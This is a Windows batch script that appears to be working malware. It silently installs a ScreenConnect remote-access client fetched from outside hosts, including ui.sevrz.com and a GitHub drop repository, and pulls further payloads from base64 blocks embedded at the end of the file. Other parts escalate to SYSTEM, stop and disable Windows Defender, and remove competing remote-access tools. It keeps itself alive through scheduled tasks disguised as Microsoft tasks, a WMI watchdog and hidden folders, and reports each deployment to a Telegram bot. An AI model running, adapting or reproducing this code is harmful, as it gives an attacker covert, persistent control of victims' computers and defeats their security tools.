@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O30 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O30 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O30: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O30" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o30_%RANDOM%%RANDOM%.cmd"
    copy /y "%~f0" "!RUNNER!" >nul 2>&1
    echo runner_fallback_unique>>"%LOG%" 2>nul
  ) else (
    mkdir "%WD%" >nul 2>&1
    attrib -h -s -r "%SELF%" >nul 2>&1
    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O30" "%SELF%" >nul 2>&1
    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
  )
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=exterminate_then_repair_then_install>>"%LOG%"
  echo engine=cmd_detached_o30>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  echo runner=!RUNNER!>>"%LOG%"
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O30 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O30: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M20" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T10" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L9" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O30: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
echo create_taskA_begin>>"%LOG%"
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O30 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O30 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0yMApyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiCnNldCAiTE9H
PSVXRCVcb3duX21vbi5sb2ciCnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIgpzZXQgIkhC
RkxBRz0lV0QlXGhiLmZsYWciCnNldCAiQ1VSTD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcY3VybC5l
eGUiCnNldCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dp
dGh1Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiVEcy
PWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3Rn
X3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTlNFQz1odHRwczovL3Jhdy5n
aXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fc2VjdXJl
LmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90PSVSQU5E
T00lJVJBTkRPTSUiCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9N
JSIKc2V0ICJPV05NT04yPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRo
dWItZHJvcEBtYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUI9
aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21h
aW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9j
ZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/
dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk1TSV9VUkw9aHR0cHM6Ly91aS5zZXZyei5jb20vQmlu
L1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiCnNldCAiTVNJ
X1BLRzE9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vcGtnLm1zaSIKc2V0ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQv
Z2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9wa2cubXNpIgpzZXQgIk1TST0lUHJvZ3JhbURh
